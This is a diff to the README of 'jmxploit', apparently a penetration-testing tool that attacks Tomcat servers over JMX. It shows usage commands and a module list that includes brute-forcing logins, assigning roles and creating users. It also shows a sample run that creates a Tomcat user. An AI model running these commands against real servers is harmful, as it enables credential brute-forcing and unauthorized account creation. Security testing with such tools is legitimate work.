@@ -14,9 +14,13 @@ Jmxploit offers two method of use.
 
 - The interactive method :
 
+```
 $ java -jar jmxploit.jar  --host SERVER --port PORT --login LOGIN --password PASSWORD
+```
 
 If authentication succeeded, information about Java environment will appear and menu will ask you to choose a module to launch.
+
+```
 
 test@jmxploit:java -jar jmxploit.jar  --host tomcat --port 8050 --login controlRole --password password
 
@@ -58,6 +62,7 @@ Please select a module to launch
 [9]	AssignRole	This attack will attribute a role to a user	
 [10] CreateUser	This attack will create a user to access Tomcat application's	
 
+```
 
 
 - The direct attack  method :
@@ -66,7 +71,9 @@ In this case jmxploit requires the attack name and required parameters in argume
 
 To list available attacks please use
 
-$java -jar jmxploit.jar --host SERVER --port PORT --login LOGIN --password PASSWORD --list 
+```
+
+test@jmxploit:java -jar jmxploit.jar --host SERVER --port PORT --login LOGIN --password PASSWORD --list 
 
      ____.  _____  ____  ___      .__         .__  __   
     |    | /     \ \   \/  /_____ |  |   ____ |__|/  |_ 
@@ -88,13 +95,14 @@ Bruteforce		This module will bruteforce logins/passwords
 AssignRole		This attack will attribute a role to a user
 CreateUser		This attack will create a user to access Tomcat application's
 
+```
 
 To launch one of them without interactive menu:
-
-$java -jar jmxploit.jar --host yourserver --port XXXX --login LOGIN --password PASSWORD --attack ModuleName --arg1_to_mod arg1 --arg2_to_mod arg2
-
+```
+$ java -jar jmxploit.jar --host yourserver --port XXXX --login LOGIN --password PASSWORD --attack ModuleName --arg1_to_mod arg1 --arg2_to_mod arg2
+```
 For example to create user :
-
+```
 test@jmxploit:java -jar jmxploit.jar  --host tomcat --port 8050 --login controlRole --password password --attack CreateUser --username tomcat_user
 
      ____.  _____  ____  ___      .__         .__  __   
@@ -111,6 +119,6 @@ CreateUser will be launch
 
 
  User should be created
- 
+```
  
 Contact : jeremy.mousset@bt.com
